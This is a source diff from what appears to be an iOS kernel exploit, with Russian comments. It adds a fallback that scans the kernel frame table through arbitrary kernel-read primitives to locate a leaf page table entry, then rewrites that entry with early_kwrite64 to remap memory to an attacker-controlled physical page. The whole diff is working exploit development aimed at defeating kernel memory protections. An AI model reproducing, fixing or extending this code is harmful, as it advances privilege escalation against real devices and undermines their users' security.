@@ -5806,7 +5806,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
             if (!kva) continue;
             uint8_t buf[0x4000];
-            if (!kreadbuf(kva, buf, sizeof(buf))) continue;
+            kreadbuf(kva, buf, sizeof(buf));   // 1.9.189: рет НЕ проверяем — ds-шим всегда 0, старый `if(!kreadbuf) continue` пропускал анализ ВСЕГДА
             for (uint32_t o = 0; o + 8 <= sizeof(buf) && nHits < 24; o += 8) {
                 uint64_t q = 0;
                 memcpy(&q, buf + o, 8);
@@ -6527,7 +6527,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
             if (!kva) continue;
             uint8_t buf[0x4000];
-            if (!kreadbuf(kva, buf, sizeof(buf))) continue;
+            kreadbuf(kva, buf, sizeof(buf));   // 1.9.189: рет НЕ проверяем — ds-шим всегда 0, старый `if(!kreadbuf) continue` пропускал анализ ВСЕГДА
             for (uint32_t o = 0; o + 8 <= sizeof(buf) && nHits < 24; o += 8) {
                 uint64_t q = 0;
                 memcpy(&q, buf + o, 8);
@@ -6675,6 +6675,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         kpNote(r, [NSString stringWithFormat:@"  [P2] kvtophys: provVA→%#llx dartVA→%#llx (0 = walker не резолвит zone-map)",
                   (unsigned long long)kvtophys(provVA), (unsigned long long)kvtophys(dartVA)]);
         __block uint64_t pteVA = 0, origPTE = 0;   // 1.9.174: __block — scanTbl пишет их из рекурсивного блока (CI failure)
+        __block uint64_t ptePAMask = 0x000003FFFE000000ULL;   // 1.9.189: маска PA-поля — ставится по кодировке найденного PTE
         uint64_t kslide2 = kconstant(base) - 0xfffffff007004000ULL;
         // 1.9.164 (р.38): таргетированный PTE — дикий скан dartObj УБРАН (он и
         // ребутил девайс SPTM-ресетом). Путь: provider+0xb8=scheduler →
@@ -6892,8 +6893,67 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             if (!pteVA) kpNote(r, [NSString stringWithFormat:@"  [P2] многоуровневый скан: %d страниц обойдено, PTE нет", nvis]);
             free(visited);
         }
+        // 1.9.189: FALLBACK 2 — PTE контент-сканом по frame-table. Корни/ctx
+        // мертвы (три прогона L0[0]=0), но mapping персистит на pipe → leaf-PTE
+        // существует и несёт backingPA почти открытым текстом. Типы {8,9,13,17,
+        // c,6} census-выжившие + 0x21 (объекты, кап) — 0xb/0x37 deadly. SCAN A
+        // выше не в счёт: там инвертирован рет kreadbuf (шим всегда 0) — буфер
+        // читался и выбрасывался, анализ не выполнялся НИ РАЗУ.
+        if (!pteVA) {
+            uint64_t ftVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
+            uint64_t totalPages = kconstant(physSize) >> 14;
+            uint64_t srcPA = spix ? vtophys(ttM, (uint64_t)spix) : 0;
+            int nCand = 0, nScanned = 0, nLoose = 0, nCap = 0;
+            static uint8_t ftChunk[0x10000];   // 4096 фреймов за проход
+            // pass 0: редкие табличные типы — все; pass 1: 0x21 — кап 2048
+            for (int pass = 0; pass < 2 && !pteVA && ftVA; pass++) {
+                for (uint64_t fb = 0; fb < totalPages && !pteVA; fb += 4096) {
+                    uint64_t nent = totalPages - fb; if (nent > 4096) nent = 4096;
+                    kreadbuf(ftVA + fb * 16, ftChunk, (size_t)(nent * 16));
+                    for (uint64_t e = 0; e < nent && !pteVA; e++) {
+                        uint8_t t = ftChunk[e * 16 + 2];   // тип = байт 2 (LE, bits[23:16])
+                        BOOL rare = (t == 0x8 || t == 0x9 || t == 0x13 || t == 0x17 || t == 0xc || t == 0x6);
+                        if (pass == 0 ? !rare : (t != 0x21)) continue;
+                        nCand++;
+                        if (pass == 1 && nScanned >= 2048) { nCap++; continue; }
+                        uint64_t pa = kconstant(physBase) + (fb + e) * 0x4000;
+                        uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
+                        if (!kva) continue;
+                        nScanned++;
+                        uint8_t pbuf[0x4000];
+                        kreadbuf(kva, pbuf, sizeof(pbuf));   // рет НЕ проверяем — шим всегда 0 (урок SCAN A)
+                        for (uint32_t o = 0; o + 8 <= sizeof(pbuf) && !pteVA; o += 8) {
+                            uint64_t q = 0; memcpy(&q, pbuf + o, 8);
+                            if (!q) continue;
+                            // кодировка A: PA в битах[12:47]; C: PA в [14:41]
+                            BOOL exA = ((q & 0x0000FFFFFFFFF000ULL) == backingPA) && (q & ~0x0000FFFFFFFFF000ULL);
+                            BOOL exC = !exA && ((q & 0x000003FFFFFFC000ULL) == backingPA) && (q & ~0x000003FFFFFFC000ULL);
+                            if (exA || exC) {
+                                pteVA = kva + o; origPTE = q;
+                                ptePAMask = exA ? 0x0000FFFFFFFFF000ULL : 0x000003FFFFFFC000ULL;
+                                kpNote(r, [NSString stringWithFormat:@"  [P3] ★ PTE dst @ %#llx (фрейм %#llx тип %#x слот %u): %#018llx — кодировка %@",
+                                          (unsigned long long)pteVA, (unsigned long long)pa, t, o / 8,
+                                          (unsigned long long)q, exA ? @"A[12:47]" : @"C[14:41]"]);
+                                break;
+                            }
+                            if (srcPA && ((q & 0x0000FFFFFFFFF000ULL) == srcPA) && (q & ~0x0000FFFFFFFFF000ULL)) {
+                                kpNote(r, [NSString stringWithFormat:@"  [P3] src-PTE @ %#llx (фрейм %#llx тип %#x слот %u): %#018llx — НЕ трогаем",
+                                          (unsigned long long)(kva + o), (unsigned long long)pa, t, o / 8, (unsigned long long)q]);
+                            }
+                            if (nLoose < 8 && (q & 0x000003FFFE000000ULL) == (backingPA & 0x000003FFFE000000ULL) && (q & ~0x000003FFFE000000ULL)) {
+                                nLoose++;
+                                kpNote(r, [NSString stringWithFormat:@"  [P3] рыхлый кандидат @ %#llx (фрейм %#llx тип %#x слот %u): %#018llx",
+                                          (unsigned long long)(kva + o), (unsigned long long)pa, t, o / 8, (unsigned long long)q]);
+                            }
+                        }
+                    }
+                }
+            }
+            kpNote(r, [NSString stringWithFormat:@"  [P3] frame-scan: кандидатов=%d обойдено=%d (кап-пропуск=%d) рыхлых=%d srcPA=%#llx — %@",
+                      nCand, nScanned, nCap, nLoose, (unsigned long long)srcPA, pteVA ? @"PTE НАЙДЕН" : @"PTE нет"]);
+        }
         if (pteVA) {
-            uint64_t newPTE = (origPTE & ~0x000003FFFE000000ULL) | (ctlPA & 0x000003FFFE000000ULL);
+            uint64_t newPTE = (origPTE & ~ptePAMask) | (ctlPA & ptePAMask);
             kpNote(r, [NSString stringWithFormat:@"  [P2] ПОДМЕНА PTE %#018llx → %#018llx", (unsigned long long)origPTE, (unsigned long long)newPTE]);
             early_kwrite64(pteVA, newPTE);
             uint64_t rb = early_kread64(pteVA);
